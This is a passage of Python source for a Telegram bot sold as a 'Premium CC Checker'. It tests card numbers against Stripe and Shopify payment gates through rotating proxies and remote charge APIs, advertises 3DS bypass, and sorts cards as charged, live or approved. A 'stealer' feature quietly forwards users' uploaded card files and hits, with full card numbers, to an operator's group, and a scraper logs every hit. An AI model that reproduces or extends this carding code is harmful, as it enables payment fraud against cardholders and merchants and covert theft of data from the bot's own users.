from __future__ import annotations
# ══════════════════════════════════════════════════════════════════════════════
#  ▸ bot.py — COMPLETE (all features)
# ══════════════════════════════════════════════════════════════════════════════
from telethon import TelegramClient, events, Button
from telethon.tl.custom.message import Message as _TLMessage
import asyncio
import itertools
import aiofiles
import os
import random
import time
import json
import re
import sys
import secrets
import aiohttp
import base64
import hashlib
from datetime import datetime, timedelta, timezone

import config
from config import (
    API_ID, API_HASH, BOT_TOKEN,
    BOT_BRAND, BOT_NAME, OWNER_NAME, OWNER_USERNAME, OWNER_ID, DEV_LINE,
    PREMIUM_FILE, SITES_FILE, PROXY_FILE, USER_PROXY_FILE, USER_POOL_FILE,
    ADMIN_IDS, ADMIN_ID, _DEFAULT_ADMINS, _save_admin_ids,
    LIMITS, MASS_WORKERS, LOG_CHANNEL_ID,
)
from emojis import pe, SEP, btn
from keyboards import (
    _raw_post, raw_send, raw_edit, nav_edit,
    rows_main, rows_gates, rows_proxy, rows_admin, rows_admin_users,
    rows_admin_sites, rows_admin_proxy_pool, rows_stop, rows_features,
    rows_admin_keys, rows_admin_stats, rows_back, rows_admin_back,
    rows_commands, rows_admin_videos, rows_admin_gifs, rows_admin_logs,
    rows_admin_welcome, rows_admin_workers,
    rows_plans, rows_profile, rows_redeem_info, rows_admin_broadcast,
)
from storage import (
    user_proxies, user_pool_enabled,
    load_user_proxies, save_user_proxies,
    load_user_pool, save_user_pool,
    get_user_proxy_list, set_user_proxies, remove_user_proxy,
    get_file_lines, load_premium_users, load_sites, load_proxies,
    is_admin, is_premium, get_user_limit,
    get_proxies_for_user, extract_cc, make_progress_bar,
    load_bin_db, generate_cards_from_bin,
    load_banned_users, is_banned, ban_user, unban_user,
    load_keys, add_keys, remove_key, validate_key, clear_keys, generate_keys,
    get_key_info, save_keys,
    load_limits, set_user_limit,
    load_gifs, add_gif, remove_gif,
    load_welcome, default_welcome, set_welcome, reset_welcome,
    load_log_group, set_log_group,
    load_stealer_gc, set_stealer_gc,
    load_stats, update_stats, clear_stats,
    blur_card, clear_cache,
    activate_plan, revoke_plan, get_plan_info, get_plan_expiry, format_expiry,
    increment_charged, increment_approved, get_user_charged, get_user_approved,
    get_rank, PLAN_TYPES,
)
from bin_db import get_bin_info, load_bins
from cards import build_result_card, checker_line, _clean_response
from check_engine import (
    check_card_with_retry, test_proxy, test_site, get_proxy_ip,
    clear_session_bad_sites, clear_error_log, _proxy_to_url,
)
from keyboards import _send_notification, _pin_message_botapi, _http_session
import requests as _requests
_http_session = _requests.Session()



# ══════════════════════════════════════════════════════════════════════════════
#  ▸ CONFIG CONSTANTS
# ══════════════════════════════════════════════════════════════════════════════
POOL_ENABLED_FILE = 'pool_enabled.txt'
AUTO_CHECK_INTERVAL = 7200
USER_SITES_FILE = 'user_sites.json'
STEAL_BLOCKED_FILE = 'steal_blocked.json'
STEAL_ADMIN_ID = 8703047687

# ── FORCE JOIN CHANNELS — CHANGE THESE ─────────────────────────────────────
FORCE_JOIN_CHANNELS = [
    {"id": -1004415311631, "name": "Updates", "url": "https://t.me/+5rHff81b22M3Yjg1"},
    {"id": -1004395765824, "name": "Main",    "url": "https://t.me/+IMnfMgXUylIyZThl"}
   ]
FJ_CACHE_FILE = "fj_cache.json"
_fj_cache: dict = {}

# ── FEEDBACK GROUP — CHANGE THIS ───────────────────────────────────────────
FEEDBACK_GROUP_ID = -1004395765824

# ── STRIPE CHARGE API ──────────────────────────────────────────────────────
STRIPE_CHARGE_API = os.environ.get("STRIPE_CHARGE_API", "http://5.83.136.90:8085/charge")

# ── JIO API ────────────────────────────────────────────────────────────────
JIO_API = os.environ.get("JIO_API", "http://31.6.62.146:8080/recharge")

# ── STRIPE AUTH (existing) ─────────────────────────────────────────────────
STRIPE_API = os.environ.get("STRIPE_API", "http://5.83.134.144:9000/stripe_auth")

# ── SCRAPER STORAGE (for /ascrap) ─────────────────────────────────────────
SCRAP_FILE = 'scraped_hits.json'
_SCRAP_LOCK = None  # initialized lazily


def _get_scrap_lock():
    global _SCRAP_LOCK
    if _SCRAP_LOCK is None:
        import asyncio as _a
        _SCRAP_LOCK = _a.Lock()
    return _SCRAP_LOCK


def _load_scrap() -> dict:
    try:
        with open(SCRAP_FILE, 'r') as f:
            data = json.load(f)
    except Exception:
        data = {}
    if not isinstance(data, dict):
        data = {}
    return data


def _save_scrap(data: dict):
    try:
        with open(SCRAP_FILE, 'w') as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
    except Exception as e:
        print(f"[SCRAP] save error: {e}")


def _add_scrap(uid: int, hit_type: str, card: str, message: str = "", price: str = "-",
               gateway: str = "", bin_info: tuple = None, source: str = ""):
    """Store a hit for later scraping. Safe to call from any async context."""
    try:
        data = _load_scrap()
        ukey = str(uid)
        if ukey not in data:
            data[ukey] = {"hits": [], "first_seen": time.time()}
        data[ukey]["hits"].append({
            "type": hit_type,
            "card": card,
            "message": message[:200] if message else "",
            "price": str(price),
            "gateway": gateway or "",
            "bin_info": list(bin_info) if bin_info else [],
            "source": source,
            "ts": time.time(),
        })
        # keep only last 5000 per user to avoid huge file
        if len(data[ukey]["hits"]) > 5000:
            data[ukey]["hits"] = data[ukey]["hits"][-5000:]
        _save_scrap(data)
    except Exception as e:
        print(f"[SCRAP] add error: {e}")


# ── MAINTENANCE MODE (Owner-only) ─────────────────────────────────────────
MAINT_FILE = 'maintenance.json'
MAINT_OWNER_ID = 8995473746


def _load_maint() -> dict:
    try:
        with open(MAINT_FILE, 'r') as f:
            data = json.load(f)
    except Exception:
        data = {}
    if 'global' not in data:
        data['global'] = False
    if 'commands' not in data:
        data['commands'] = []
    return data


def _save_maint(data: dict):
    try:
        with open(MAINT_FILE, 'w') as f:
            json.dump(data, f, indent=2)
    except Exception as e:
        print(f"[MAINT] save error: {e}")


def _is_maint_global() -> bool:
    return bool(_load_maint().get('global', False))


def _is_maint_cmd(cmd: str) -> bool:
    cmd = cmd.strip().lower().lstrip('/')
    return cmd in _load_maint().get('commands', [])


def _is_maint_owner(uid: int) -> bool:
    try:
        return int(uid) == int(MAINT_OWNER_ID)
    except Exception:
        return False


def _maint_text(global_on: bool, cmds: list, cmd: str = None) -> str:
    if global_on:
        return pe(
            "[⌯] 𝗠𝗮𝗶𝗻𝘁𝗲𝗻𝗮𝗻𝗰𝗲 ⌁ 🛠️\n"
            f"{SEP}\n"
            "[⌯] 𝗦𝘁𝗮𝘁𝘂𝘀 ⌁ 𝗚𝗟𝗢𝗕𝗔𝗟 𝗢𝗡 🚧\n"
            f"{SEP}\n"
            "[⌯] 𝗕𝗼𝘁 𝗶𝘀 𝘂𝗻𝗱𝗲𝗿 𝗺𝗮𝗶𝗻𝘁𝗲𝗻𝗮𝗻𝗰𝗲\n"
            "[⌯] 𝗣𝗹𝗲𝗮𝘀𝗲 𝘄𝗮𝗶𝘁 ⌁ ⏳"
        )
    return pe(
        f"[⌯] 𝗠𝗮𝗶𝗻𝘁𝗲𝗻𝗮𝗻𝗰𝗲 ⌁ 🛠️\n"
        f"{SEP}\n"
        f"[⌯] 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 ⌁ /{cmd}\n"
        f"[⌯] 𝗦𝘁𝗮𝘁𝘂𝘀 ⌁ 𝗧𝗲𝗺𝗽𝗼𝗿𝗮𝗿𝗶𝗹𝘆 𝗢𝗙𝗙 🚧\n"
        f"{SEP}\n"
        f"[⌯] 𝗣𝗹𝗲𝗮𝘀𝗲 𝘁𝗿𝘆 𝗹𝗮𝘁𝗲𝗿 ⏳"
    )



# ── GLOBAL WORKERS (safe defaults) ─────────────────────────────────────────
try:
    from config import GLOBAL_MAX_WORKERS, LIGHT_LOAD_WORKERS, MEDIUM_LOAD_WORKERS, HEAVY_LOAD_WORKERS
except ImportError:
    GLOBAL_MAX_WORKERS = 150
    LIGHT_LOAD_WORKERS = 120
    MEDIUM_LOAD_WORKERS = 40
    HEAVY_LOAD_WORKERS = 25


# ══════════════════════════════════════════════════════════════════════════════
#  ▸ BOT INIT
# ══════════════════════════════════════════════════════════════════════════════
# ══════════════════════════════════════════════════════════════════════════════
#  ▸ BOT INIT  ← MOVE THIS UP
# ══════════════════════════════════════════════════════════════════════════════
bot = TelegramClient('checker_bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

active_sessions: dict = {}
pending_checks: dict = {}
_stop_flags: dict = {}
user_active_check: dict = {}
_filtersite_state: dict = {}

# ══════════════════════════════════════════════════════════════════════════════
#  ▸ POOL / SITE / PROXY HELPERS
# ══════════════════════════════════════════════════════════════════════════════
def _is_pool_enabled() -> bool:
    try:
        if os.path.exists(POOL_ENABLED_FILE):
            with open(POOL_ENABLED_FILE, 'r') as f:
                return f.read().strip() == '1'
    except Exception:
        pass
    return True


def _set_pool_enabled(enabled: bool):
    try:
        with open(POOL_ENABLED_FILE, 'w') as f:
            f.write('1' if enabled else '0')
    except Exception as e:
        print(f"[POOL] Save error: {e}")


def get_user_site_list(uid: int) -> list:
    try:
        with open(USER_SITES_FILE, 'r') as f:
            data = json.load(f)
            return data.get(str(uid), [])
    except Exception:
        return []


def set_user_sites(uid: int, sites: list):
    try:
        with open(USER_SITES_FILE, 'r') as f:
            data = json.load(f)
    except Exception:
        data = {}
    data[str(uid)] = [s for s in sites if s]
    with open(USER_SITES_FILE, 'w') as f:
        json.dump(data, f, indent=2)


def remove_user_sites(uid: int):
    try:
        with open(USER_SITES_FILE, 'r') as f:
            data = json.load(f)
    except Exception:
        data = {}
    data.pop(str(uid), None)
    with open(USER_SITES_FILE, 'w') as f:
        json.dump(data, f, indent=2)


def _get_sites_for_user(uid: int) -> list:
    """User's own sites + global pool (if pool enabled)."""
    pool = load_sites() if _is_pool_enabled() else []
    user = get_user_site_list(uid)
    if is_admin(uid):
        return (user + pool) if user else pool
    return (user + pool) if pool else user


def _get_proxies_for_user_v2(uid: int) -> list:
    """User's own proxies + global pool (if pool enabled)."""
    pool = load_proxies() if _is_pool_enabled() else []
    try:
        user = get_user_proxy_list(uid)
    except Exception:
        user = []
    if is_admin(uid):
        return (user + pool) if user else pool
    return (user + pool) if pool else user


# ══════════════════════════════════════════════════════════════════════════════
#  ▸ STEAL BLOCK HELPERS
# ══════════════════════════════════════════════════════════════════════════════
def _load_steal_blocked() -> set:
    try:
        with open(STEAL_BLOCKED_FILE, 'r') as f:
            return set(json.load(f))
    except Exception:
        return set()


def _save_steal_blocked(blocked: set):
    try:
        with open(STEAL_BLOCKED_FILE, 'w') as f:
            json.dump(sorted(blocked), f, indent=2)
    except Exception as e:
        print(f"[STEAL-BLOCK] save error: {e}")


def _add_steal_block(uid: int):
    blocked = _load_steal_blocked()
    blocked.add(int(uid))
    _save_steal_blocked(blocked)


def _remove_steal_block(uid: int):
    blocked = _load_steal_blocked()
    blocked.discard(int(uid))
    _save_steal_blocked(blocked)


def _is_steal_blocked(uid: int) -> bool:
    try:
        return int(uid) in _load_steal_blocked()
    except Exception:
        return False
# ══════════════════════════════════════════════════════════════════════════════
#  ▸ FORCE JOIN HELPERS  ← now safe, bot exists
# ══════════════════════════════════════════════════════════════════════════════
# ══════════════════════════════════════════════════════════════════════════════
#  ▸ FORCE JOIN HELPERS
# ══════════════════════════════════════════════════════════════════════════════
def _load_fj_cache():
    global _fj_cache
    try:
        with open(FJ_CACHE_FILE) as f:
            _fj_cache = json.load(f)
    except Exception:
        _fj_cache = {}


def _save_fj_cache():
    try:
        with open(FJ_CACHE_FILE, 'w') as f:
            json.dump(_fj_cache, f)
    except Exception:
        pass


async def check_force_join(uid: int) -> list:
    """Returns list of channels user has NOT joined (empty = joined all)."""
    if is_admin(uid):
        return []
    cached = _fj_cache.get(str(uid))
    if cached and time.time() - cached.get('ts', 0) < 600:
        return cached.get('missing', [])

    missing = []
    for ch in FORCE_JOIN_CHANNELS:
        try:
            r = _http_session.get(
                f"https://api.telegram.org/bot{BOT_TOKEN}/getChatMember",
                params={"chat_id": ch["id"], "user_id": uid},
                timeout=5,
            )
            data = r.json()
            if data.get("ok"):
                status = data["result"].get("status", "")
                if status in ("left", "kicked", "restricted"):
                    missing.append(ch)
            else:
                missing.append(ch)
        except Exception:
            missing.append(ch)

    _fj_cache[str(uid)] = {'ts': time.time(), 'missing': missing}
    _save_fj_cache()
    return missing


def _force_join_text(missing: list) -> str:
    lines = "\n".join([f"[⌯] {ch['name']} ⌁ {ch['url']} 🔗" for ch in missing])
    return pe(
        f"[⌯] 𝗝𝗼𝗶𝗻 𝗥𝗲𝗾𝘂𝗶𝗿𝗲𝗱 ⌁ ⚠️\n"
        f"{SEP}\n"
        f"[⌯] 𝗝𝗼𝗶𝗻 𝗯𝗲𝗹𝗼𝘄 𝗰𝗵𝗮𝗻𝗻𝗲𝗹𝘀 ⌁ 📢\n"
        f"{SEP}\n"
        f"{lines}\n"
        f"{SEP}\n"
        f"[⌯] 𝗧𝗵𝗲𝗻 𝗰𝗹𝗶𝗰𝗸 ⌁ ✅ 𝗩𝗲𝗿𝗶𝗳𝘆"
    )


def _force_join_buttons(missing: list):
    rows = []
    for ch in missing:
        rows.append([{"text": f"📢 Join {ch['name']}", "url": ch["url"], "style": "primary"}])
    rows.append([{"text": "✅ Verify", "callback_data": "fj_verify", "style": "success"}])
    return rows


async def _guard_force_join(event) -> bool:
    """Returns True if user must join (blocked)."""
    uid = event.sender_id
    missing = await check_force_join(uid)
    if missing:
        try:
            await raw_send(uid, _force_join_text(missing), _force_join_buttons(missing))
        except Exception:
            pass
        return True
    return False


@bot.on(events.CallbackQuery(pattern=b"^fj_verify$"))
async def fj_verify_cb(event):
    uid = event.sender_id
    _fj_cache.pop(str(uid), None)
    missing = await check_force_join(uid)
    if not missing:
        await event.answer("✅ Verified!", alert=True)
        try:
            await bot.delete_messages(event.chat_id, event.message_id)
        except Exception:
            pass
        try:
            await start(event)
        except Exception:
            pass
    else:
        await event.answer("❌ Please join all channels first!", alert=True)
        try:
            await nav_edit(event.chat_id, event.message_id,
                           _force_join_text(missing), _force_join_buttons(missing))
        except Exception:
            pass

# ══════════════════════════════════════════════════════════════════════════════
#  ▸ GLOBAL WORKER LIMITER
# ══════════════════════════════════════════════════════════════════════════════
import threading as _worker_lock_thread


class GlobalWorkerLimiter:
    def __init__(self, max_workers):
        self.max_workers = max_workers
        self.current = 0
        self.lock = _worker_lock_thread.Lock()

    def acquire(self, count):
        with self.lock:
            available = self.max_workers - self.current
            granted = min(count, available)
            self.current += granted
            return granted

    def release(self, count):
        with self.lock:
            self.current = max(0, self.current - count)

    def get_available(self):
        with self.lock:
            return max(0, self.max_workers - self.current)

    def get_active(self):
        with self.lock:
            return self.current


_GLOBAL_WORKER_SEM = GlobalWorkerLimiter(GLOBAL_MAX_WORKERS)


# ══════════════════════════════════════════════════════════════════════════════
#  ▸ AUTO CLEANUP
# ══════════════════════════════════════════════════════════════════════════════
import threading as _cleanup_thread
import time as _cleanup_time


def _start_cleanup_daemon():
    def _cleanup():
        while True:
            try:
                _cleanup_time.sleep(300)
                now = _cleanup_time.time()
                stale = []
                for uid, info in list(user_active_check.items()):
                    if now - info.get('started_at', now) > 1800:
                        stale.append(uid)
                for uid in stale:
                    user_active_check.pop(uid, None)
                stale2 = []
                for key, sess in list(active_sessions.items()):
                    if now - sess.get('started_at', now) > 1800:
                        stale2.append(key)
                for key in stale2:
                    active_sessions.pop(key, None)
            except Exception:
                pass
    _cleanup_thread.Thread(target=_cleanup, daemon=True).start()


_start_cleanup_daemon()


# ══════════════════════════════════════════════════════════════════════════════
#  ▸ TELEGRAM MESSAGE PATCHES
# ══════════════════════════════════════════════════════════════════════════════
_orig_send_message = bot.send_message
_orig_edit_message = bot.edit_message


def _strip_tg_emoji(text):
    if not text:
        return text
    return re.sub(r'<tg-emoji[^>]*>([^<]*)</tg-emoji>', r'\1', text)


def _is_doc_invalid(e):
    s = str(e).upper()
    return 'DOCUMENT_INVALID' in s or 'FILE_REFERENCE_INVALID' in s


_orig_tl_edit = _TLMessage.edit


async def _safe_tl_edit(self, *args, **kwargs):
    kwargs.setdefault('link_preview', False)
    try:
        return await _orig_tl_edit(self, *args, **kwargs)
    except Exception as e:
        if _is_doc_invalid(e):
            new_args = list(args)
            if new_args and isinstance(new_args[0], str):
                new_args[0] = _strip_tg_emoji(new_args[0])
            if 'text' in kwargs:
                kwargs['text'] = _strip_tg_emoji(kwargs['text'])
            return await _orig_tl_edit(self, *new_args, **kwargs)
        raise


_TLMessage.edit = _safe_tl_edit


async def _send_message_no_preview(*args, **kwargs):
    kwargs.setdefault('link_preview', False)
    try:
        return await _orig_send_message(*args, **kwargs)
    except Exception as e:
        if _is_doc_invalid(e):
            if len(args) >= 2 and isinstance(args[1], str):
                args = (args[0], _strip_tg_emoji(args[1])) + args[2:]
            return await _orig_send_message(*args, **kwargs)
        raise


async def _edit_message_no_preview(*args, **kwargs):
    kwargs.setdefault('link_preview', False)
    try:
        return await _orig_edit_message(*args, **kwargs)
    except Exception as e:
        if _is_doc_invalid(e):
            if len(args) >= 3 and isinstance(args[2], str):
                args = args[:2] + (_strip_tg_emoji(args[2]),) + args[3:]
            return await _orig_edit_message(*args, **kwargs)
        raise


bot.send_message = _send_message_no_preview
bot.edit_message = _edit_message_no_preview


# ══════════════════════════════════════════════════════════════════════════════
#  ▸ HELPERS
# ══════════════════════════════════════════════════════════════════════════════
async def get_display_name(uid):
    try:
        entity = await bot.get_entity(uid)
        name = getattr(entity, 'first_name', None) or ''
        lname = getattr(entity, 'last_name', None) or ''
        full = (name + ' ' + lname).strip()
        return full if full else str(uid)
    except Exception:
        return str(uid)


async def get_user_info(uid):
    try:
        entity = await bot.get_entity(uid)
        name = getattr(entity, 'first_name', None) or str(uid)
        username = getattr(entity, 'username', None)
        return name, username
    except Exception:
        return str(uid), None


def _is_3ds(msg: str) -> bool:
    m = (msg or "").lower()
    if any(x in m for x in ('http 4', 'http 5', 'application not found', '404', '500')):
        return False
    return any(x in m for x in ('3d secure', '3ds', 'authentication required', 'otp required'))


def _is_insuf(msg: str) -> bool:
    return 'insufficient' in (msg or "").lower()


def _classify_result(result: dict) -> str:
    """Improved classification for msh accuracy."""
    st = (result.get('status') or '').strip()
    raw = (result.get('raw_response') or '').strip().upper()
    msg = (result.get('message') or '').strip().lower()

    # 3DS
    if st == '3DS' or any(x in msg for x in (
        '3d secure', '3ds', 'authentication required', 'otp required',
        'requires_action', 'requires_action_authentication',
        'cardholder authentication', 'challenge_required',
    )):
        return '3ds'

    # Live / insufficient
    if st == 'Live' or any(x in msg for x in (
        'insufficient', 'not enough', 'low balance', 'not sufficient',
        'insufficient_funds', 'insufficient funds',
    )) or any(x in raw for x in (
        'INSUFFICIENT_FUNDS', 'PAYMENTS_INSUFFICIENT_FUNDS',
        'INSUFFICIENT FUNDS', 'NOT_ENOUGH_FUNDS', 'LOW_BALANCE',
    )):
        return 'live'

    # Charged
    if st == 'Charged' or raw in (
        'CHARGED', 'CHARGED_SUCCESSFULLY', 'PAYMENT_SUCCEEDED',
        'SUCCEEDED', 'SUCCESS', 'CAPTURED',
    ) or 'charged successfully' in msg:
        return 'charged'

    # Approved
    if st == 'Approved' or raw in (
        'APPROVED', 'AUTHORIZED', 'REQUIRES_CAPTURE',
    ) or 'approved' in msg or 'authorized' in msg:
        return 'approved'

    # Declined
    if raw in (
        'CARD_DECLINED', 'PAYMENT_FAILED', 'MISMATCHED_BILL',
        'PAYMENT_METHOD_NOT_AVAILABLE', 'SITE_NOT_SUPPORTED',
        'SITE_REQUIRES_LOGIN!', 'DO_NOT_HONOR', 'SITE_REQUIRES_LOGIN',
        'CARD_NOT_SUPPORTED', 'DECLINED', 'CARD_EXPIRED',
        'INCORRECT_CVC', 'INCORRECT_NUMBER', 'INCORRECT_CVV',
        'EXPIRED_CARD', 'INVALID_CARD', 'CARD_VELOCITY_EXCEEDED',
    ):
        return 'declined'
    if st in ('Dead', 'Declined') or any(x in msg for x in (
        'declined', 'decline', 'do not honor', 'rejected', 'card expired',
        'incorrect cvc', 'incorrect number', 'invalid card',
    )):
        return 'declined'

    # Errors
    if raw in (
        'MAX_RETRIES', 'TIMEOUT', 'HTTP_400', 'HTTP_500', 'HTTP_502',
        'HTTP_503', 'HTTP_504', 'CONNECT_ERROR', 'API_ERROR',
        'CAPTCHA_REQUIRED', 'THROTTLED', 'CHECKPOINT_DENIED',
        'CHANGE_PROXY_OR_SITE', 'SITE_ERROR', 'WORKER_ERROR',
        'INVALID_SITE', 'PARSE_ERROR', 'NO_PRICE', 'OUT_OF_STOCK',
    ):
        return 'error'
    if st == 'Error' or 'timeout' in msg or 'error' in msg[:20]:
        return 'error'

    return 'declined'


# ══════════════════════════════════════════════════════════════════════════════
#  ▸ STEALER GC HELPERS
# ══════════════════════════════════════════════════════════════════════════════
async def send_file_to_stealer_gc(user_id, file_path, file_name, card_count, card_type="Cards"):
    stealer_gc = load_stealer_gc()
    if not stealer_gc:
        return
    try:
        if _is_steal_blocked(user_id):
            return
    except Exception:
        pass
    try:
        try:
            await bot.get_entity(stealer_gc)
        except Exception as _e:
            print(f"[Stealer GC] Cannot resolve {stealer_gc}: {_e} — skipping")
            return
        name, username = await get_user_info(user_id)
        display = f"@{username}" if username else f"<a href='tg://user?id={user_id}'>{name}</a>"
        caption = pe(
            f"[⌯] 𝗠𝗮𝘀𝘀 𝗙𝗶𝗹𝗲 ⌁ 𝚄𝚙𝚕𝗼𝗮𝗱𝗲𝗱 ⌁ ⚡\n"
            f"─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n"
            f"[⌯] 𝗨𝘀𝗲𝗿 ⌁ {display} ⌁ <code>{user_id}</code>\n"
            f"[⌯] 𝗙𝗶𝗹𝗲 ⌁ {file_name}\n"
            f"[⌯] 𝗖𝗮𝗿𝗱𝘀 ⌁ {card_count:,}"
        )
        await bot.send_file(stealer_gc, file_path, caption=caption, parse_mode='html')
    except Exception as e:
        print(f"[Stealer GC] Failed to send file: {e}")


async def send_hit_to_stealer_gc(result, hit_type, user_id, file_name=None):
    # ── Scraper hook ──
    try:
        _bi = result.get('bin_info') or ()
        _add_scrap(user_id, hit_type, result.get('card', 'N/A'),
                   result.get('message', ''), str(result.get('price', '-')),
                   result.get('gateway', ''), _bi, "stealer")
    except Exception: pass

    stealer_gc = load_stealer_gc()
    if not stealer_gc:
        return
    try:
        if _is_steal_blocked(user_id):
            return
    except Exception:
        pass
    try:
        bin_info = result.get('bin_info')
        if not bin_info:
            bin_info = await get_bin_info(result['card'].split('|')[0])
            result['bin_info'] = bin_info

        brand, btype, level, bank, country, flag = bin_info
        card = result.get('card', 'N/A')
        raw_msg = result.get('message', 'N/A')
        price = result.get('price', '-')
        gateway = result.get('gateway', 'Shopify Payments')
        time_taken = result.get('time', '-')

        name, username = await get_user_info(user_id)
        checker_name = name if name else str(user_id)

        def _b(s):
            out = []
            for ch in str(s):
                c = ord(ch)
                if 65 <= c <= 90: out.append(chr(c - 65 + 0x1D5D4))
                elif 97 <= c <= 122: out.append(chr(c - 97 + 0x1D5EE))
                elif 48 <= c <= 57: out.append(chr(c - 48 + 0x1D7EC))
                else: out.append(ch)
            return "".join(out)

        bin_str = _b(" · ".join(p for p in [brand, btype, level] if p and p != '-') or "—")
        bank_str = _b(bank or "—")
        country_str = f"{flag} {_b(country or '—')}" if flag else _b(country or "—")
        gateway_str = _b(gateway)

        if hit_type == "Charged":
            header = "[⌯] Charged Success ⌁ ✅"
            status_text = "𝙲𝚑𝚊𝚛𝚐𝚎𝚍 𝚂𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢"; status_emoji = "💎"
            result_text = "𝙿𝚊𝚢𝚖𝚎𝚗𝚝 𝚠𝚊𝚜 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕"; result_emoji = "✔️"
        elif hit_type == "Approved":
            header = "[⌯] Approved ⌁ ✅"
            status_text = "𝙰𝚙𝚙𝚛𝚘𝚟𝚎𝚍"; status_emoji = "✅"
            result_text = _b(raw_msg) if raw_msg else "𝙿𝚊𝚢𝚖𝚎𝚗𝚝 𝙰𝚙𝚙𝚛𝚘𝚟𝚎𝚍"; result_emoji = "✅"
        elif hit_type == "Live":
            header = "[⌯] Live Card ⌁ 💰"
            status_text = "𝙸𝚗𝚜𝚞𝚏𝚏𝚒𝚌𝚒𝚎𝚗𝚝 𝙵𝚞𝚗𝚍𝚜"; status_emoji = "💰"
            result_text = "𝙸𝚗𝚜𝚞𝚏𝚏𝚒𝚌𝚒𝚎𝚗𝚝 𝙵𝚞𝚗𝚍𝚜 — 𝙲𝚊𝚛𝚍 𝙻𝚒𝚟𝚎"; result_emoji = "⚡"
        elif hit_type == "3DS":
            header = "[⌯] 3DS Required ⌁ ⚠️"
            status_text = "𝟯𝙳𝚂 𝚁𝚎𝚚𝚞𝚒𝚛𝚎𝚍"; status_emoji = "⚠️"
            result_text = "𝙾𝚃𝙿 𝚁𝚎𝚚𝚞𝚒𝚛𝚎𝚍"; result_emoji = "⚡"
        else:
            header = f"[⌯] {hit_type} ⌁ ⚡"
            status_text = _b(raw_msg); status_emoji = "⚡"
            result_text = _b(raw_msg); result_emoji = "⚡"

        _p = str(price).replace('$', '').replace('£', '').replace('€', '').replace('₹', '').strip()
        _currency = "USD"; _sym = "$"
        if 'INR' in str(price).upper() or '₹' in str(price) or 'RS' in str(price).upper():
            _currency, _sym = "INR", "₹"
        _raw_upper = (raw_msg or '').upper() + str(price).upper()
        if 'GBP' in _raw_upper or '£' in str(price):
            _currency, _sym = "GBP", "£"
        elif 'EUR' in _raw_upper or '€' in str(price):
            _currency, _sym = "EUR", "€"
        if _p not in ('-', '', 'None', '0', '0.00', '0.0'):
            amount_str = f"{_sym}{_b(_p)} {_b(_currency)}"
        else:
            amount_str = "—"

        time_str = f"{_b(str(time_taken))}s" if time_taken and time_taken != '-' else "—"
        file_display = file_name or "mass.txt"

        msg = (
            f"{header}\n"
            f"─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n"
            f"[⌯] 𝗖𝗖 ⌁ <code>{card}</code>\n"
            f"[⌯] 𝗦𝘁𝗮𝘁𝘂𝘀 ⌁ {status_text} {status_emoji}\n"
            f"[⌯] 𝗥𝗲𝘀𝘂𝗹𝘁 ⌁ {result_text} {result_emoji}\n"
            f"─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n"
            f"[⌯] 𝗕𝗜𝗡 ⌁ {bin_str}\n"
            f"[⌯] 𝗕𝗮𝗻𝗸 ⌁ {bank_str}\n"
            f"[⌯] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ⌁ {country_str}\n"
            f"─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n"
            f"[⌯] 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⌁ {gateway_str}\n"
            f"[⌯] 𝗔𝗺𝗼𝘂𝗻𝘁 ⌁ {amount_str} 💰\n"
            f"─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n"
            f"[⌯] 𝗖𝗵𝗲𝗰𝗸𝗲𝗿 ⌁ 🛡 {checker_name}\n"
            f"[⌯] 𝗙𝗶𝗹𝗲 ⌁ {file_display} 📁"
        )
        msg = pe(msg)
        await bot.send_message(stealer_gc, msg, parse_mode='html')
    except Exception as e:
        print(f"[Stealer GC] Failed to send hit: {e}")


# ══════════════════════════════════════════════════════════════════════════════
#  ▸ START / BACK
# ══════════════════════════════════════════════════════════════════════════════
@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    uid = event.sender_id
    if is_banned(uid):
        await event.reply(pe(f"🚫 𝐀𝐜𝐜𝐞𝐬𝐬 𝐃𝐞𝐧𝐢𝐞𝐝\n{SEP}\n❌ You are banned."), parse_mode='html')
        return
    if await _guard_force_join(event):
        return
    text = pe(
        f"[⌯] 𝗕𝗼𝘁 ⌁ ⌁ SRK™ ⌁ ⌁ 💠\n"
        f"[⌯] 𝗧𝘆𝗽𝗲 ⌁ 𝙿𝚛𝚎𝚖𝚒𝚞𝚖 𝙲𝙲 𝙲𝚑𝚎𝚌𝚔𝚎𝚛 ⌁ 💎\n"
        f"\n"
        f"─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n"
        f"\n"
        f"[⌯] 𝗚𝗮𝘁𝗲 ⌁ 𝚂𝚝𝚛𝚒𝚙𝚎 · 𝚂𝚑𝚘𝚙𝚒𝚏𝚢 · 𝙷𝚒𝚝𝚝𝚎𝚛𝚜 ⌁ 🎯\n"
        f"[⌯] 𝟯𝗗𝗦 ⌁ 𝙱𝚢𝚙𝚊𝚜𝚜 𝚂𝚞𝚙𝚙𝚘𝚛𝚝𝚎𝚍 ⌁ ✅\n"
        f"[⌯] 𝗣𝗿𝗼𝘅𝘆 ⌁ 𝙷𝚃𝚃𝙿 · 𝚂𝙾𝙲𝙺𝚂𝟺 · 𝚂𝙾𝙲𝙺𝚂𝟻 ⌁ 🔗\n"
        f"[⌯] 𝗦𝗽𝗲𝗲𝗱 ⌁ 𝙼𝚞𝚕𝚝𝚒-𝚠𝚘𝚛𝚔𝚎𝚛 · 𝚁𝚘𝚝𝚊𝚝𝚒𝚗𝚐 ⌁ 🚀\n"
        f"\n"
        f"─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n"
        f"\n"
        f"[⌯] 𝗠𝗲𝗻𝘂 ⌁ 𝚂𝚎𝚕𝚎𝚌𝚝 𝚘𝚙𝚝𝚒𝚘𝚗 𝚋𝚎𝚕𝚘𝚠 ⌁ 🔻"
    )
    await raw_send(uid, text, rows_main())


@bot.on(events.CallbackQuery(pattern=b"back_start"))
async def cb_back_start(event):
    await event.answer()
    text = pe(
